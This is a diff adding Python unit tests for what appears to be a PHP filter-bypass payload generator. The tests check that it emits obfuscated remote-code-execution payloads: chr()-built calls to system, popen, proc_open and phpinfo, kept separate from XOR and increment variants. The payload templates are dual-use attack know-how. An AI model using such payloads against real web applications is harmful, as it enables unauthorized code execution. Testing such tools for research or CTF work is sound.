@@ -203,5 +203,51 @@ class TestNewTechniques(unittest.TestCase):
         self.assertTrue(any("'r'" in p and "stream_get_contents" in p for p in popen_payloads))
         self.assertTrue(any("$__spec=" in p and "$__pipes" in p for p in proc_open_payloads))
 
+    def test_chr_payloads(self):
+        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
+
+        self.assertIn(
+            f"$_={utils.generate_php_chr('system')};$_({utils.generate_php_chr('id')});",
+            payloads,
+        )
+
+        chr_popen = utils.generate_php_chr("popen")
+        chr_proc_open = utils.generate_php_chr("proc_open")
+        self.assertTrue(
+            any("$__f=" in p and chr_popen in p and "stream_get_contents" in p for p in payloads),
+            "chr popen payload not found",
+        )
+        self.assertTrue(
+            any("$__f=" in p and chr_proc_open in p and "$__spec=" in p for p in payloads),
+            "chr proc_open payload not found",
+        )
+
+    def test_phpinfo_chr_payload_present(self):
+        options = bypass.BypassOptions(
+            flagfile=None,
+            read_env=False,
+            reflect_shell=False,
+            ip="127.0.0.1",
+            port=8080,
+            phpinfo=True,
+            php_version=8.0,
+        )
+        payloads = bypass.generate_candidates(options)
+        self.assertIn(f"$_={utils.generate_php_chr('phpinfo')};$_();", payloads)
+
+    def test_chr_payloads_do_not_couple_with_not_xor_increment(self):
+        payloads = bypass._generate_php_rce_payloads("id", php_version=8.0)
+        chr_payloads = [p for p in payloads if "chr(" in p]
+        self.assertTrue(chr_payloads, "chr payloads not generated")
+
+        for payload in chr_payloads:
+            self.assertNotIn("(~'", payload)
+            self.assertNotIn("^", payload)
+
+        increment_payloads = [p for p in payloads if "$_____(" in p]
+        self.assertTrue(increment_payloads, "increment payloads not generated")
+        for payload in increment_payloads:
+            self.assertNotIn("chr(", payload)
+
 if __name__ == '__main__':
     unittest.main()
